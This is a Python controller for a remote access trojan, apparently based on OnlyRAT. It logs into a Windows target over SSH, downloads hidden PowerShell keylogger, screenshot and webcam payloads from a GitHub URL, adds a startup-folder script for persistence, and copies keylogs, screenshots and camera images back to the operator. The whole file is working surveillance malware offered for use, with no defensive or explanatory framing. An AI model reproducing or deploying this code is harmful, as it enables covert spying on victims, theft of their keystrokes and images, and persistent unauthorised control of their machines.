import os
import sys
import getpass
import random as r
from datetime import datetime

banner = """
|\  \|\  \|\   __  \|\   ____\|\  \|\  \ |\  ___ \ |\   __  \    
\ \  \\\  \ \  \|\  \ \  \___|\ \  \/  /|\ \   __/|\ \  \|\  \   
 \ \   __  \ \   __  \ \  \    \ \   ___  \ \  \_|/_\ \   _  _\  
  \ \  \ \  \ \  \ \  \ \  \____\ \  \\ \  \ \  \_|\ \ \  \\  \| 
   \ \__\ \__\ \__\ \__\ \_______\ \__\\ \__\ \_______\ \__\\ _\ 
    \|__|\|__|\|__|\|__|\|_______|\|__| \|__|\|_______|\|__|\|__|
"""

help_menu = """
        [+] Arguments:
            <username>.rat ------------ Access Target Via Config File
            -d, --dfig <vps_user> ----- Download RAT Config File 
            -u, --update -------------- Update RAT
            -r, --remove -------------- Uninstall RAT
            -h, --help  --------------- Help Menu

        [+] Example:
            main.py bluecosmo.rat
"""

options_menu = """
 [+] Command and Control:
            [0] -------------- Connect Command Line 
            [1] ---------- Install Payloads to Target (Keylogger, Screenshot, Camera)
            [2] ----------------- Run KeyLogger
            [3] --------------- Take file Keylogger (.log)
            [4] --- Run Screenshot
            [5] -- Take file screenshot (.png)
            [6] ---------------- Run Camera
            [7] --------------- Take picture (.bmp)
            [8] ------------- Restart PC target

        [+] Payloads:
            Coming Soon...

        [+] Options:
            [help] ------------------- Help Menu
            [man] -------------------- Onlyrat Manual
            [config] ----------------- Display RAT File
            [version] ---------------- Version Number
            [update] ----------------- Update OnlyRAT
            [uninstall] -------------- Uninstall OnlyRAT
            [quit] ------------------- Quit

            * any other commands will be 
              sent through your terminal

        [*] Select an [option]...
"""
username = getpass.getuser()
header = f"[~] {username}@toolhacking $:"

    
def run_command(address, username, password, command):
    os.system(f"sshpass -p \"{password}\" ssh {username}@{address} '{command}'")
    
def payloads(address, username, password, temp, startup):
    print("[*] Starting install payloads ...")
    payload_keylogger = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/keylogger.ps1' -OutFile '{temp}/happy/system.ps1'\""
    payload_screenshot = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/screenshot.ps1' -OutFile '{temp}/happy/system32.ps1'\""
    payload_camera = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/CommandCam.exe' -OutFile '{temp}/happy/system.exe'\""
    payload_control_camera = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/control_cam.ps1' -OutFile '{temp}/happy/coltrol_system.ps1'\""
    payload_detect = f"powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass \"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/detect_action.ps1' -OutFile '{startup}/system.ps1'\""
    run_command(address, username, password, payload_keylogger)
    run_command(address, username, password, payload_screenshot)
    run_command(address, username, password, payload_camera)
    run_command(address, username, password, payload_control_camera)
    run_command(address, username, password, payload_detect)
    print("[+] Install Successful ...")


def run_control_keylogger(address, username, password, temp, startup):
    print("[*] Starting run control keylogger ...")
    run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system.ps1"
    run_command(address, username, password, run_control)
    print("[+] Keylogger running ...")

def take_file_log(address,name ,username, password, path):
    # file output *.log
    os.system(f"sshpass -p \"{password}\" scp {username}@{address}:{path}/sad/{name}.log /home/kali/Downloads")
    
def screenshot(address, username, password, temp, startup):
    print("[*] Starting run control screenshot ...")
    run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system32.ps1"
    run_command(address, username, password, run_control)
    print("[+] Screenshot running ...")
    
def take_screenshot(address, username, password, path):
    os.system(f"sshpass -p \"{password}\" scp {username}@{address}:{path}/sad/happy.png /home/kali/Downloads")

def control_camera(address, username, password, temp, startup):
    print("[*] Starting control camera ...")
    run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {temp}/happy/system.exe"
    run_command(address, username, password, run_control)
    print("[+] Started camera . . .")

def take_camera_picture(address, username, password, path):
    os.system(f"sshpass -p \"{password}\" scp {username}@{address}:{path}/happy/image.bmp /home/kali/Downloads")
    run_control = f"start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass {path}/happy/control_system.ps1"
    run_command(address, username, password, run_control)
    
    
def terminated():
    sys.exit()

def read_config_file(config_file):
    config_json = {}
    read_file = open(config_file, "r").readlines()
    
    config_json["IPADDRESS"] = read_file[0]
    config_json["USERNAME"] = read_file[1]
    config_json["PASSWORD"] = read_file[2]
    config_json["NAME"] = read_file[3]
    config_json["WOKING_TEMP"] = read_file[4]
    config_json["WOKING_STARTUP"] = read_file[5]

    return config_json

def os_detection(address, username, password):
    os_name = os.system(f"sshpass -p \"{password}\" ssh {username}@{address} '(Get-WmiObject Win32_OperatingSystem).Caption'")
    return os_name

def connect(address, username, password):
    os.system(f"sshpass -p \"{password}\" ssh {username}@{address}")
    
def restart_pc(address, username, password):
    os.system(f"sshpass -p \"{password}\" ssh {username}@{address} 'shutdown /r'")

    

def cli(args): 
    print(banner)
    print(read_config_file(args))
    
    if args.endswith(".rat"):
        config_json = read_config_file(args)
        IPADDRESS = config_json["IPADDRESS"].strip()
        PASSWORD = config_json["PASSWORD"].strip()
        USERNAME = config_json['USERNAME'].strip()
        NAME = config_json["NAME"].strip()
        TEMP = config_json["WOKING_TEMP"].strip().replace("\\", "/")
        STARTUP = config_json["WOKING_STARTUP"].strip().replace("\\", "/")
        while(True):
            options = input(f"{header}")
            if options == "menu":
                print(options_menu)
            elif options == "quit":
                terminated()
            elif options == "0":
                connect(IPADDRESS, USERNAME, PASSWORD)
            elif options == "1":
                payloads(IPADDRESS, USERNAME, PASSWORD, TEMP, STARTUP)
            elif options == '2':
                run_control_keylogger(IPADDRESS, USERNAME, PASSWORD, TEMP, STARTUP)
            elif options == "3":
                take_file_log(IPADDRESS, NAME,USERNAME,PASSWORD, TEMP)
            elif options == "4":
                screenshot(IPADDRESS, USERNAME, PASSWORD, TEMP, STARTUP)
            elif options == "5":
                take_screenshot(IPADDRESS, USERNAME, PASSWORD, TEMP)
            elif options == "6":
                control_camera(IPADDRESS, USERNAME, PASSWORD, TEMP, STARTUP)
            elif options == "7":
                take_camera_picture(IPADDRESS, USERNAME, PASSWORD, TEMP)
            elif options == "8":
                restart_pc(IPADDRESS, USERNAME, PASSWORD)
    elif args in ["-h", "-help"]:
        print(help_menu)
        
        
def main():
    try:
        sys.argv[1]
    except IndexError:
        print(help_menu)
    else:
        cli(sys.argv[1])
if __name__ == "__main__":
    main()
